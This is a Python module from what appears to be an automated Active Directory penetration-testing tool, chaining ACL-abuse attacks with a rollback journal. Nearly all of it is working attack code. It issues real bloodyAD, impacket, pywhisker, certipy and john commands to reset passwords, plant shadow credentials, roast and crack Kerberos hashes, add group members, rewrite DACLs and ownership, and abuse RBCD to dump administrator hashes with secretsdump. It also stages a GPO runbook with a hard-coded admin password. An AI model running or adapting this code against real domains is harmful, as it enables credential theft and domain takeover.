"""ACL attack chain with write-ahead journaling — every domain mutation is
recorded before execution and is either auto-revertible via `forge --rollback`
or explicitly flagged ADMIN_REQUIRED."""
import re
import secrets
import string
from pathlib import Path

from loguru import logger

from ..core.engine import ATTACKS
from ..core.state import Cred, Finding

EMPTY_NT = "31d6cfe0d16ae931b73c59d7e0c089c0"


def register_attack(name):
    def deco(fn):
        ATTACKS[name] = fn
        return fn
    return deco


# ---------------------------------------------------------------- helpers

def record_finding(ctx, rule, detail=""):
    f = rule.get("finding", {})
    if f:
        ctx.state.add_finding(Finding(rule["id"], f.get("severity", "info"),
                                      f.get("title", rule["name"]),
                                      f"{rule['name']}. {detail}".strip(),
                                      f.get("remediation", "")))


def _valid_cred(state, plaintext_only=False):
    cands = [c for c in state.creds if c.validated]
    if plaintext_only:
        cands = [c for c in cands if c.secret_type == "password"]
    return cands[0] if cands else None


def _cred_for(ctx, item):
    want = (item.get("principal_sam") or "").lower()
    for c in ctx.state.creds:
        if c.validated and c.username.lower() == want:
            return c
    return _valid_cred(ctx.state)


def _bloody(ctx, cred, args, name):
    t = ctx.cfg.target
    secret = cred.secret if cred.secret_type == "password" else f":{cred.secret}"
    return ctx.ex.run(
        f"bloodyAD --host {t.dc_ip} -d {t.domain} -u '{cred.username}' -p '{secret}' {args}",
        name=name)


def _imp_auth(ctx, cred, host=None):
    t = ctx.cfg.target
    if cred.secret_type == "password":
        return f"'{t.domain}\\{cred.username}:{cred.secret}'" + (f"@{host}" if host else "")
    return (f"'{t.domain}\\{cred.username}@{host}' -hashes :{cred.secret}" if host
            else f"'{t.domain}\\{cred.username}' -hashes :{cred.secret}")


def gen_password(n=15):
    pool = string.ascii_letters + string.digits + "!@#$%^&*_-"
    while True:
        p = "".join(secrets.choice(pool) for _ in range(n))
        if (any(c.islower() for c in p) and any(c.isupper() for c in p)
                and any(c.isdigit() for c in p) and any(c in "!@#$%^&*_-" for c in p)):
            return p


def _validate_and_add(ctx, user, secret, stype, source):
    t = ctx.cfg.target
    flag, val = ("-p", secret) if stype == "password" else ("-H", secret)
    r = ctx.ex.run(f"nxc smb {t.dc_ip} -u '{user}' {flag} '{val}'", name=f"validate_{user}")
    if "[+]" in r.stdout or "Pwn3d!" in r.stdout:
        c = Cred(user, secret, stype, source)
        c.validated = True
        if ctx.state.add_cred(c):
            logger.success(f"💰 new validated cred: {user} ({source})")
            return 1
    else:
        logger.warning(f"cred for {user} not valid (disabled / must-change flag?)")
    return 0


def _crack_hashfile(ctx, path, source, jtr_fmt=None):
    st = ctx.state
    wl = ctx.cfg.wordlists.get("passwords", "")
    fmt = f"--format={jtr_fmt} " if jtr_fmt else ""
    if wl:
        ctx.ex.run(f"john {fmt}--wordlist={wl} {path}", name=f"john_{Path(path).stem}")
    r = ctx.ex.run(f"john {fmt}--show {path}", name=f"johnshow_{Path(path).stem}")
    found = 0
    for line in r.stdout.splitlines():
        if ":" not in line:
            continue
        left, pw = line.rsplit(":", 1)
        if not pw:
            continue
        user = left.split("@")[0].split("\\")[-1].split(":")[0].rstrip("$").lower()
        if st.add_cred(Cred(user, pw, "password", source)):
            logger.success(f"💰 cracked: {user} : {pw}")
            found += 1
    return found


def _grant_full_control(ctx, item) -> bool:
    """dacledit FullControl, journaled with its exact removal command."""
    t = ctx.cfg.target
    cred = _cred_for(ctx, item)
    if not cred:
        return False
    with ctx.journal.mutate(
            attack="acl_write_dacl", kind="DACL_ADD_ACE",
            target=item["target_sam"], principal=item["principal_sam"],
            revert_level="AUTO",
            revert_template=("impacket-dacledit -action remove -rights FullControl "
                             "-principal '{principal}' -target '{target}' "
                             "-dc-ip {dc_ip} {imp_auth}"),
            pre_state={"target_sid": item["target_sid"]},
            detail="ACE added by WriteDACL bootstrap; removal restores original DACL") as h:
        r = ctx.ex.run(
            f"impacket-dacledit -action write -rights FullControl "
            f"-principal '{item['principal_sam']}' -target '{item['target_sam']}' "
            f"-dc-ip {t.dc_ip} {_imp_auth(ctx, cred, t.dc_ip)}",
            name=f"dacl_{item['target_sam']}")
        h.ok = r.ok
        if not r.ok:
            h.error = r.stderr[:150]
    if h.ok:
        ctx.state.facts.setdefault("synthetic_acl_edges", []).append({
            "target_sid": item["target_sid"], "right": "GenericAll",
            "principal_sid": item["principal_sid"]})
        ctx.state.facts["chain_progressed"] = True
        logger.success(f"✍️  GenericAll granted: {item['principal_sam']} → {item['target_sam']}")
    return h.ok


# ---------------------------------------------------------------- attacks

@register_attack("acl_reset_password")
def acl_reset_password(ctx, rule):
    new = 0
    for item in ctx.state.facts.get("acl_plan_reset_pwd", []):
        cred = _cred_for(ctx, item)
        if not cred:
            break
        newpwd = gen_password()
        # Original plaintext destroyed by design → never claim auto-revert.
        with ctx.journal.mutate(
                attack="acl_reset_password", kind="PASSWORD_RESET",
                target=item["target_sam"], principal=cred.username,
                revert_level="ADMIN_REQUIRED",
                detail=(f"password of '{item['target_sam']}' was reset during testing "
                        f"and the original is unrecoverable. Admin: force a reset, "
                        f"distribute new secret to the account owner, verify no service "
                        f"dependencies broke.")) as h:
            r = _bloody(ctx, cred, f"set password '{item['target_sam']}' '{newpwd}'",
                        name=f"acl_setpwd_{item['target_sam']}")
            h.ok = r.ok
            if not r.ok:
                h.error = r.stderr[:150]
        if h.ok:
            new += _validate_and_add(ctx, item["target_sam"], newpwd, "password",
                                     f"ACL reset ({item['right']})")
        else:
            logger.warning(f"set password failed for {item['target_sam']}: {r.stderr[:150]}")
    record_finding(ctx, rule)
    return new


@register_attack("acl_shadow_credentials")
def acl_shadow_credentials(ctx, rule):
    new, t = 0, ctx.cfg.target
    for item in ctx.state.facts.get("acl_plan_shadow_creds", []):
        cred = _cred_for(ctx, item)
        if not cred:
            break
        if cred.secret_type != "password":
            logger.warning(f"shadow creds need a plaintext principal; skipping {item['target_sam']}")
            continue
        base = f"{ctx.ex.rawdir}/shadow_{item['target_sam']}"
        with ctx.journal.mutate(
                attack="acl_shadow_credentials", kind="KEY_CRED_ADD",
                target=item["target_sam"], principal=cred.username,
                revert_level="AUTO",
                revert_template=("pywhisker -d {domain} -u '{principal}' -p '<plaintext req>' "
                                 "--target '{target}' --action remove --device-id '{inline}'"),
                detail="planted KeyCredential removed inline on success; "
                       "rollback retries only if inline removal failed") as h:
            r = ctx.ex.run(
                f"pywhisker -d {t.domain} -u '{cred.username}' -p '{cred.secret}' "
                f"--target '{item['target_sam']}' --action add --filename {base}",
                name=f"whisker_add_{item['target_sam']}")
            h.ok = r.ok
            if not h.ok:
                h.error = r.stderr[:150]
                continue
            dev = re.search(r"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})",
                            r.stdout, re.I)
            if dev:
                h.inline = dev.group(1)
        if not h.ok:
            continue
        auth = ctx.ex.run(f"certipy auth -pfx {base}.pfx -dc-ip {t.dc_ip}",
                          name=f"whisker_auth_{item['target_sam']}")
        m = re.search(r"([0-9a-f]{32}):([0-9a-f]{32})", auth.stdout)
        if m and m.group(2) != EMPTY_NT:
            new += _validate_and_add(ctx, item["target_sam"], m.group(2), "nthash",
                                     f"ShadowCreds ({item['right']})")
        if h.inline:
            rc = ctx.ex.run(f"pywhisker -d {t.domain} -u '{cred.username}' -p '{cred.secret}' "
                            f"--target '{item['target_sam']}' --action remove "
                            f"--device-id {h.inline}",
                            name=f"whisker_clean_{item['target_sam']}")
            if rc.ok:
                ctx.journal._mark("REVERTED", h.entry_id, "undone inline (pywhisker remove)")
    record_finding(ctx, rule)
    return new


@register_attack("acl_targeted_asrep")
def acl_targeted_asrep(ctx, rule):
    new, t = 0, ctx.cfg.target
    hashes = f"{ctx.ex.rawdir}/asrep_acl.hashes"
    for item in ctx.state.facts.get("acl_plan_targeted_asrep", []):
        cred = _cred_for(ctx, item)
        if not cred:
            break
        Path(hashes).unlink(missing_ok=True)
        with ctx.journal.mutate(
                attack="acl_targeted_asrep", kind="UF_FLAG_SET",
                target=item["target_sam"], principal=cred.username,
                revert_level="AUTO",
                revert_template=("bloodyAD --host {dc_ip} -d {domain} {bl_auth} "
                                 "set object '{target}' dontReqPreauth -v 0"),
                pre_state={"attribute": "dontReqPreauth", "before": "false"},
                detail="pre-auth flag toggled for AS-REP roast; reverted inline") as h:
            r_set = _bloody(ctx, cred, f"set object '{item['target_sam']}' dontReqPreauth -v 1",
                            name=f"asrep_on_{item['target_sam']}")
            h.ok = r_set.ok
            if h.ok:
                r_off = _bloody(ctx, cred, f"set object '{item['target_sam']}' dontReqPreauth -v 0",
                                name=f"asrep_off_{item['target_sam']}")
                if r_off.ok:
                    ctx.journal._mark("REVERTED", h.entry_id, "undone inline (flag unset)")
            else:
                h.error = r_set.stderr[:150]
        if h.ok:
            ctx.ex.run(f"impacket-GetNPUsers '{t.domain}/{item['target_sam']}' -no-pass "
                       f"-dc-ip {t.dc_ip} -format hashcat -outputfile {hashes}",
                       name=f"asrep_req_{item['target_sam']}")
            if Path(hashes).exists():
                new += _crack_hashfile(ctx, hashes, f"Targeted AS-REP ({item['target_sam']})")
    record_finding(ctx, rule)
    return new


@register_attack("acl_targeted_kerberoast")
def acl_targeted_kerberoast(ctx, rule):
    new, t = 0, ctx.cfg.target
    hashes = f"{ctx.ex.rawdir}/kerb_acl.hashes"
    for item in ctx.state.facts.get("acl_plan_targeted_kerberoast", []):
        cred = _cred_for(ctx, item)
        if not cred:
            break
        spn = f"cifs/{secrets.token_hex(4)}"
        with ctx.journal.mutate(
                attack="acl_targeted_kerberoast", kind="SPN_ADD",
                target=item["target_sam"], principal=cred.username,
                revert_level="AUTO",
                revert_template=("bloodyAD --host {dc_ip} -d {domain} {bl_auth} "
                                 "set object '{target}' servicePrincipalName -v ''"),
                pre_state={"added_spn": spn},
                detail="temporary SPN deleted inline; rollback retries if delete failed") as h:
            r_set = _bloody(ctx, cred,
                            f"set object '{item['target_sam']}' servicePrincipalName -v '{spn}'",
                            name=f"spn_add_{item['target_sam']}")
            h.ok = r_set.ok
            if h.ok:
                r_del = _bloody(ctx, cred,
                                f"set object '{item['target_sam']}' servicePrincipalName -v ''",
                                name=f"spn_del_{item['target_sam']}")
                if r_del.ok:
                    ctx.journal._mark("REVERTED", h.entry_id, "undone inline (SPN deleted)")
            else:
                h.error = r_set.stderr[:150]
        if h.ok:
            Path(hashes).unlink(missing_ok=True)
            ctx.ex.run(f"impacket-GetUserSPNs {_imp_auth(ctx, cred, t.dc_ip)} -dc-ip {t.dc_ip} "
                       f"-request-user '{item['target_sam']}' -outputfile {hashes}",
                       name=f"kerb_req_{item['target_sam']}")
            if Path(hashes).exists():
                new += _crack_hashfile(ctx, hashes, f"Targeted Kerberoast ({item['target_sam']})",
                                       jtr_fmt="krb5tgs")
    record_finding(ctx, rule)
    return new


@register_attack("acl_group_add")
def acl_group_add(ctx, rule):
    for item in ctx.state.facts.get("acl_plan_group_add", []):
        cred = _cred_for(ctx, item)
        if not cred:
            break
        with ctx.journal.mutate(
                attack="acl_group_add", kind="GROUP_MEMBER_ADD",
                target=item["target_name"], principal=item["principal_sam"],
                revert_level="AUTO",
                revert_template=("bloodyAD --host {dc_ip} -d {domain} {bl_auth} "
                                 "remove groupMember '{target}' '{principal}'"),
                pre_state={"group_sid": item["target_sid"]},
                detail="member was not in group pre-test (verified by parser before add)") as h:
            r = _bloody(ctx, cred,
                        f"add groupMember '{item['target_name']}' '{item['principal_sam']}'",
                        name=f"groupadd_{item['target_name']}")
            h.ok = r.ok
            if not r.ok:
                h.error = r.stderr[:150]
        if h.ok:
            ctx.state.facts.setdefault("added_group_memberships", {}) \
                .setdefault(item["target_sid"], []).append(item["principal_sid"])
            ctx.state.facts["chain_progressed"] = True
            logger.success(f"➕ {item['principal_sam']} added to {item['target_name']} "
                           f"— group rights now inherited on re-analysis")
    record_finding(ctx, rule)
    return 0


@register_attack("acl_write_dacl")
def acl_write_dacl(ctx, rule):
    for item in ctx.state.facts.get("acl_plan_write_dacl", []):
        _grant_full_control(ctx, item)
    record_finding(ctx, rule)
    return 0


@register_attack("acl_write_owner")
def acl_write_owner(ctx, rule):
    t = ctx.cfg.target
    for item in ctx.state.facts.get("acl_plan_write_owner", []):
        cred = _cred_for(ctx, item)
        if not cred:
            continue
        owner_before = item.get("owner_sid", "")
        auto = bool(owner_before)
        with ctx.journal.mutate(
                attack="acl_write_owner", kind="OWNER_CHANGE",
                target=item["target_sam"], principal=item["principal_sam"],
                revert_level="AUTO" if auto else "ADMIN_REQUIRED",
                revert_template=("impacket-owneredit -action write -new-owner '{owner_before}' "
                                 "-target '{target}' -dc-ip {dc_ip} {imp_auth}") if auto else "",
                pre_state={"owner_before": owner_before or "unknown"},
                detail=(f"original owner SID {owner_before} captured from BloodHound"
                        if auto else
                        "original owner not present in BloodHound data — restore from "
                        "AD backup / compare against a clean snapshot")) as h:
            r = ctx.ex.run(f"impacket-owneredit -action write -new-owner '{item['principal_sam']}' "
                           f"-target '{item['target_sam']}' -dc-ip {t.dc_ip} "
                           f"{_imp_auth(ctx, cred, t.dc_ip)}",
                           name=f"owneredit_{item['target_sam']}")
            h.ok = r.ok
            if not r.ok:
                h.error = r.stderr[:150]
        if h.ok:
            logger.success(f"👑 ownership: {item['principal_sam']} → {item['target_sam']}")
            _grant_full_control(ctx, item)   # LIFO: DACL undone before owner
    record_finding(ctx, rule)
    return 0


@register_attack("acl_rbcd")
def acl_rbcd(ctx, rule):
    new, t = 0, ctx.cfg.target
    fqdns = ctx.state.facts.get("computer_fqdn_map", {})
    for item in ctx.state.facts.get("acl_plan_rbcd", []):
        victim = item["target_sam"]
        fqdn = fqdns.get(victim.lower())
        cred = _cred_for(ctx, item)
        if not cred:
            break
        if not fqdn:
            logger.warning(f"no FQDN for {victim} — cannot build SPN, skipping")
            continue
        mach, machpass = f"AF{secrets.token_hex(3).upper()}", gen_password()

        # --- mutation 1: machine account creation
        with ctx.journal.mutate(
                attack="acl_rbcd", kind="MACHINE_CREATE",
                target=f"{mach}$", principal=cred.username,
                revert_level="AUTO",
                revert_template=("impacket-addcomputer -computer-name '{target}' -delete "
                                 "-dc-ip {dc_ip} {imp_auth}"),
                pre_state={"note": f"name {mach} is random (AF-prefixed); did not exist pre-test"},
                detail="temp machine account created for RBCD; delete on rollback") as h1:
            r1 = ctx.ex.run(f"impacket-addcomputer -computer-name '{mach}$' "
                            f"-computer-pass '{machpass}' "
                            f"-dc-ip {t.dc_ip} {_imp_auth(ctx, cred, t.dc_ip)}",
                            name=f"addcomp_{mach}")
            h1.ok = r1.ok
            if not r1.ok:
                h1.error = r1.stderr[:150]
        if not h1.ok:
            continue

        # --- mutation 2: delegation attribute on the victim
        with ctx.journal.mutate(
                attack="acl_rbcd", kind="RBCD_DELEGATE_WRITE",
                target=victim, principal=f"{mach}$",
                revert_level="AUTO",
                revert_template=("impacket-rbcd -delegate-from '{principal}' "
                                 "-delegate-to '{target}' "
                                 "-action remove -dc-ip {dc_ip} {imp_auth}"),
                detail="rbcd remove strips ONLY our delegate ACE — pre-existing "
                       "delegation entries on the victim are preserved") as h2:
            r2 = ctx.ex.run(f"impacket-rbcd -delegate-from '{mach}$' -delegate-to '{victim}' "
                            f"-action write -dc-ip {t.dc_ip} {_imp_auth(ctx, cred, t.dc_ip)}",
                            name=f"rbcd_{victim}")
            h2.ok = r2.ok
            if not r2.ok:
                h2.error = r2.stderr[:150]
        if not h2.ok:
            continue
        ctx.state.facts["chain_progressed"] = True

        r3 = ctx.ex.run(f"impacket-getST -spn 'cifs/{fqdn}' -impersonate administrator "
                        f"-dc-ip {t.dc_ip} '{t.domain}\\{mach}$:{machpass}'",
                        name=f"getst_{victim}", timeout=300)
        m = re.search(r"Saving ticket in (\S+\.ccache)", r3.stdout)
        if not m:
            continue
        dump = ctx.ex.run(f"impacket-secretsdump -k -no-pass 'administrator@{fqdn}'",
                          name=f"secretsdump_{victim}", timeout=600,
                          env={"KRB5CCNAME": str(Path(m.group(1)).resolve())})
        for line in dump.stdout.splitlines():
            mm = re.match(r"(.+?):\d+:[0-9a-f]{32}:([0-9a-f]{32}):::", line)
            if mm and mm.group(2) != EMPTY_NT:
                c = Cred(mm.group(1).split("\\")[-1], mm.group(2), "nthash", f"RBCD@{victim}")
                if ctx.state.add_cred(c):
                    logger.success(f"💰 RBCD dump: {c.username}")
                    new += 1
    record_finding(ctx, rule)
    return new


@register_attack("gpo_abuse")
def gpo_abuse(ctx, rule):
    """GPO control is domain-modifying → stage a reviewed runbook, never auto-run."""
    st, t = ctx.state, ctx.cfg.target
    lines = ["#!/bin/bash", "# forge staged GPO abuse — REVIEW BEFORE RUNNING",
             f"# domain: {t.domain}  dc: {t.dc_ip}", ""]
    for g in st.facts.get("gpo_owned_control", []):
        lines += [f"# GPO '{g['gpo']}' ({', '.join(g['rights'])}) — deploy local admin:",
                  f"python3 pyGPOAbuse.py --localuser svc_update --password 'P@ssw0rd123!' "
                  f"--userdomain {t.domain.split('.')[0]} --domainname {t.domain} "
                  f"--dc-ip {t.dc_ip} --guid '{g['guid']}'", ""]
    for c in st.facts.get("gplink_control", []):
        lines += [f"# Container '{c['container']}' ({', '.join(c['rights'])}) — link owned GPO:",
                  f"# bloodyAD --host {t.dc_ip} -d {t.domain} -u <u> -p <p> \\",
                  f"#   set object '{c['container']}' gPLink "
                  f"-v '[LDAP://CN=<GPO-GUID>,CN=Policies,CN=System,"
                  f"DC={',DC='.join(t.domain.split('.'))};0]'", ""]
    out = Path(ctx.cfg.output_dir) / "gpo_runbook.sh"
    out.write_text("\n".join(lines))
    logger.info(f"GPO abuse runbook staged → {out}")
    record_finding(ctx, rule, "Runbook staged; execution deferred (disruptive).")
    return 0
